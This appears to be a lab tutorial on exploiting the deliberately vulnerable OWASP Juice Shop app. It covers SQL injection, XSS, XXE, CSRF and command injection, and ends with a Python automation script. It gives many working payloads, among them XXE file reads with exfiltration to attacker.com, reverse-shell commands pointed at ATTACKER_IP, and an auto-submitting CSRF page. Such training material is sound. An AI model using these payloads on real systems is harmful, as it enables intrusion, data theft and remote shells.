üíâ Challenge 1: SQL Injection Login Bypass

HIGH SEVERITY

What is SQL Injection?

üí° SQL Injection Explained Simply

Imagine a library where you ask for a book by filling out a form. The librarian takes your request and runs: SELECT * FROM books WHERE title = 'YOUR_INPUT'

But what if instead of a book title, you write: nothing' OR '1'='1?

The query becomes: SELECT * FROM books WHERE title = 'nothing' OR '1'='1'

Since '1'='1' is ALWAYS TRUE, this returns ALL books! That's SQL injection - injecting SQL code into user input to change query logic.

The Vulnerability

Juice Shop's login page doesn't properly escape user input. When you type an email and password, the server runs something like: 

SELECT * FROM users WHERE email = 'YOUR_EMAIL' AND password = 'YOUR_PASSWORD'

If we inject SQL code into the email field, we can bypass the password check entirely!

The Exploit

  1. Go to the Login Page
    Click "Account" ‚Üí "Login" in the top right
  2. Inject SQL into Email Field
    Email: ' OR 1=1--
    Password: anything (doesn't matter)
  3. Click Login
    You're now logged in as the first user in the database (usually admin)!

Why It Works

The query becomes:

SELECT * FROM users WHERE email = '' OR 1=1--' AND password = 'anything'

Let's break this down:

  • '' - Empty email (false)
  • OR - "Or" operator
  • 1=1 - Always true!
  • -- - SQL comment symbol (ignores everything after, including the password check)
üî• Real-World Impact

SQL injection has been used to steal millions of credit cards, expose entire user databases, and deface websites. It's been #1 on the OWASP Top 10 multiple times. NEVER trust user input!

Other SQL Injection Payloads to Try

# Login as admin specifically
admin'--
admin@juice-sh.op'--

# Bypass without knowing any username
' OR '1'='1'--
' OR 'a'='a'--

# Union-based injection (extract data)
' UNION SELECT NULL,NULL,NULL--

üö® Challenge 2: Cross-Site Scripting (XSS)

HIGH SEVERITY

What is XSS?

üí° XSS Explained Simply

Cross-Site Scripting (XSS) is when you inject JavaScript code into a website, and that code runs in other users' browsers. Imagine leaving a sticky note on a public bulletin board, but the note is actually a command that makes people's phones ring when they look at it!

Example: If a website displays user comments without sanitizing them, you could post a comment like <script>alert('HACKED!')</script> and everyone who views that page would see your alert!

Finding the XSS Vulnerability

Juice Shop has several XSS vulnerabilities. Let's exploit the search function!

  1. Navigate to the Search Bar
    Look at the top of the Juice Shop homepage
  2. Test for XSS
    Type: <script>alert('XSS')</script>
    Press Enter
  3. Watch the Alert Pop Up
    If you see an alert box saying "XSS", congratulations - you found an XSS vulnerability!

More XSS Payloads to Try

# Basic alert
<script>alert('XSS')</script>

# Image tag XSS (when <script> is blocked)
<img src=x onerror="alert('XSS')">

# Steal cookies (malicious!)
<script>alert(document.cookie)</script>

# Redirect users
<script>window.location='http://evil.com'</script>

# DOM-based XSS (via URL)
http://localhost:3000/#/search?q=<script>alert('XSS')</script>

Types of XSS

Reflected XSS

Your payload is immediately reflected back in the response. Example: Search results showing your search term without sanitization.

Stored XSS

Your payload is saved in the database and affects everyone who views it. Example: Malicious comment that executes when others read comments.

DOM XSS

The vulnerability is in client-side JavaScript code that processes user input. Example: JavaScript reading URL parameters and inserting them into the page.

üî• Real-World Impact

XSS can steal session cookies (hijacking accounts), redirect users to phishing sites, deface websites, or install malware. Major sites like Facebook, Twitter, and eBay have all had XSS vulnerabilities. It's EXTREMELY common!

üì¶ Challenge 7: XML External Entity (XXE) Attack

HIGH SEVERITY

What is XXE?

üí° XXE Explained Simply

XML = a way to structure data (like JSON). XXE exploits XML parsers to:

  • Read local files (like /etc/passwd)
  • Execute server-side code
  • Scan internal networks
  • Cause denial of service

Think: "What if I could tell the server to read its own files and send them to me?"

Finding XML Endpoints

  1. Look for File Upload Features
    Juice Shop has a "Complain" feature that accepts file uploads
  2. Check What File Types Are Accepted
    Try uploading: .pdf, .zip, .xml
  3. Create a Malicious XML File
    We'll craft XML that reads server files!

The XXE Exploit

Create a file called xxe.xml with this content:

<?xml version="1.0" encoding="UTF-8"?>
<!-- Define an external entity that reads /etc/passwd -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>

<!-- Reference the entity in the XML -->
<complaint>
  <message>&xxe;</message>
</complaint>

How It Works

  1. Define External Entity
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
    This creates a variable xxe that contains the contents of /etc/passwd
  2. Reference the Entity
    &xxe; - This gets replaced with the file contents!
  3. Server Processes It
    The XML parser reads the file and includes it in the response

Advanced XXE Techniques

üîç Read System Files

<!ENTITY xxe SYSTEM "file:///etc/passwd">
<!ENTITY xxe SYSTEM "file:///etc/hosts">
<!ENTITY xxe SYSTEM "file:///var/log/apache2/access.log">

üåê SSRF via XXE

<!ENTITY xxe SYSTEM "http://internal-server/admin">
<!ENTITY xxe SYSTEM "http://localhost:8080/admin">

üí£ Denial of Service

<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;">
<!-- Billion Laughs Attack -->

üì§ Data Exfiltration

<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
%dtd;

üé≠ Challenge 8: Cross-Site Request Forgery (CSRF)

MEDIUM SEVERITY

What is CSRF?

üí° CSRF Explained with a Story

You're logged into your bank. An attacker sends you an email with an image: 

<img src="https://bank.com/transfer?to=attacker&amount=1000">

When your browser loads the image, it sends a request to your bank - and since you're logged in, the bank thinks YOU authorized the transfer!

CSRF = tricking your browser into making requests you didn't intend.

How CSRF Works

  1. Victim Logs Into Target Site
    You log into Juice Shop ‚Üí browser stores session cookie
  2. Attacker Crafts Malicious Page
    Creates HTML that makes requests to Juice Shop
  3. Victim Visits Attacker's Page
    Could be via email link, forum post, etc.
  4. Browser Automatically Sends Cookies
    Your browser includes your Juice Shop session cookie in the request!

Crafting a CSRF Attack

Create an HTML file called csrf.html:

<html>
  <body>
    <h1>You Won a Prize!</h1>
    <p>Click below to claim:</p>
    
    <!-- Hidden form that changes victim's email -->
    <form id="csrf" action="http://localhost:3000/api/Users/1" method="POST">
      <input type="hidden" name="email" value="attacker@evil.com">
    </form>
    
    <!-- Auto-submit form when page loads -->
    <script>
      document.getElementById('csrf').submit();
    </script>
  </body>
</html>

Testing CSRF in Juice Shop

  1. Log Into Juice Shop
    Open: http://localhost:3000 and log in
  2. Open Your csrf.html File
    In a different tab, open your malicious HTML file
  3. Check What Happened
    Go back to Juice Shop ‚Üí Check your profile
    Your email may have changed!

üíª Challenge 10: OS Command Injection

CRITICAL SEVERITY

What is Command Injection?

üí° Command Injection Explained

Imagine a website that lets you "ping" servers. Internally, it runs: 

os.system("ping " + user_input)

What if you enter: google.com; whoami?

The server runs: ping google.com; whoami
The semicolon (;) means "run next command" - so it runs whoami after ping!

Command Injection Characters

Unix/Linux

;   # Semicolon - run next command
&   # Ampersand - run in background
|   # Pipe - send output to next command
&&  # AND - run if first succeeds
||  # OR - run if first fails
`   # Backticks - command substitution
$() # Command substitution (modern)

Windows

&   # Run next command
|   # Pipe output
&&  # AND operator
||  # OR operator
^   # Escape character

Finding Command Injection in Juice Shop

  1. Look for User Input That Runs System Commands
    Common places:
    • File upload/processing features
    • Image conversion tools
    • Network diagnostic tools (ping, traceroute)
    • Search functionality
  2. Test Basic Injection
    Try these payloads: 
    ; whoami
; pwd
; ls
; cat /etc/passwd
  3. Look for Command Output
    If you see system command results in the response, you've got command injection!

Exploitation Examples

üîç Information Gathering

; whoami
; id
; uname -a
; cat /etc/passwd
; env

üìÇ File System Access

; ls -la /
; find / -name "*.txt"
; cat /app/config.js
; cat /var/log/apache2/access.log

üåê Network Recon

; ifconfig
; netstat -an
; arp -a
; route

üö™ Reverse Shell

; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
; nc -e /bin/bash ATTACKER_IP 4444

Advanced: Blind Command Injection

Sometimes you don't see output directly. Use these techniques:

üéØ Blind Injection Techniques
  1. Time-Based

  2. DNS Exfiltration

Automation with Python

Once you understand the vulnerabilities manually, automate them:

#!/usr/bin/python3
# Automated Juice Shop SQL Injection

import requests

base_url = "http://localhost:3000"

# SQL Injection payloads
payloads = [
    "' OR 1=1--",
    "' OR 'a'='a'--",
    "admin'--",
    "' UNION SELECT NULL--"
]

# Test each payload
for payload in payloads:
    data = {
        "email": payload,
        "password": "anything"
    }
    
    response = requests.post(f"{base_url}/rest/user/login", json=data)
    
    if response.status_code == 200:
        print(f"[+] SUCCESS: {payload}")
        print(f"    Token: {response.json().get('authentication', {}).get('token')}")
    else:
        print(f"[-] FAILED: {payload}")

# Automated IDOR testing
print("\n[*] Testing IDOR on user endpoints...")
for user_id in range(1, 20):
    response = requests.get(f"{base_url}/api/Users/{user_id}")
    if response.status_code == 200:
        user = response.json()
        print(f"[+] User {user_id}: {user.get('email')}")
